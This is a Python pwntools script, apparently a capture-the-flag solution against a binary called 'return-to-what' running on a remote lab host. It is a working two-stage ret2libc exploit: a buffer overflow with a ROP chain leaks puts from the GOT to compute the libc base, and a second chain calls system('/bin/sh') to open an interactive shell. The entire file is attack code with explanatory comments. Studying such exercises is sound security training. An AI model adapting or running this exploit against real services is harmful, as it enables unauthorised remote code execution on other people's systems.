#!/usr/bin/env python3

from pwn import *

def main():

    # log level
    context.terminal = ["tmux", "splitw", "-v"]
    context.log_level = 'DEBUG'

    # setup process in pwntools
    context.arch = "amd64"
    elf=context.binary=ELF("./return-to-what")
    libc=ELF("./libc6_2.27-3ubuntu1.3_amd64.so")
    p=remote("192.168.0.22",1337)

    # The exploit will be two stages:
    # 1. The payload of stage 1 will leak address of
    # put and return to main function to execute the
    # program again.
    # 2. The second stage will send a buffer with rop chain that will
    # give us a shell.


    ############### Stage 1 Payload  #############################

    # The buffer looks like this to create a rop that will
    # leak address of put.
    # padding + pop_rdi + puts_got + puts_plt + main_plt

    # trigger buffer overflow
    offset = 56
    padding = b"A" * offset


    # create rop chain

    # 0x000000000040122b : pop rdi ; ret

    puts_got = p64(elf.got["puts"])
    puts_plt = p64(elf.plt["puts"])
    main_plt = p64(elf.symbols["main"] + 1 ) # this plus one is for stack alignment
    # create a rop chain with pwntools
    rop=ROP(elf)
    pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])

    # create buffer
    stage1_payload = [
            padding,
            pop_rdi,
            puts_got,
            puts_plt,
            main_plt
            ]

    stage1_payload = b"".join(stage1_payload)

    # send the stage 1 payload
    p.sendlineafter("?\n",stage1_payload)

    # print address of put in libc
    puts_leaked=u64(p.recvuntil("\n").strip().ljust(8,b"\x00"))
    info(f"Puts LEAK address: {hex(puts_leaked)}")

    # calculate libc base address
    libc_base_address = puts_leaked - libc.symbols['puts']

    #print the base address
    info(f"LIBC BASE address: {hex(libc_base_address)}")

    ############### Stage 2 Payload  #############################

    # calculate the address of system and "/bin/sh" inside libc
    system_inside_libc=libc.symbols['system']
    binsh_inside_libc=next(libc.search(b'/bin/sh'))
    exit_iniside_libc=libc.symbols['exit']


    # Now calculate the real address in execution time
    system=p64(libc_base_address + system_inside_libc)
    binsh=p64(libc_base_address + binsh_inside_libc)
    exit=p64(libc_base_address + exit_iniside_libc)

    # Now join all and send as second input. Crossfinger !!!
    # padding + pop_rdi + binsh + system

    stage2_payload = [
        padding,
        pop_rdi,
        binsh,
        system,
        exit
    ]

    stage2_payload = b"".join(stage2_payload)

   # send stage 2 payload
   #

    p.sendlineafter("?\n",stage2_payload)

   # # interact with process
    p.interactive()


if __name__ == "__main__":
    main()
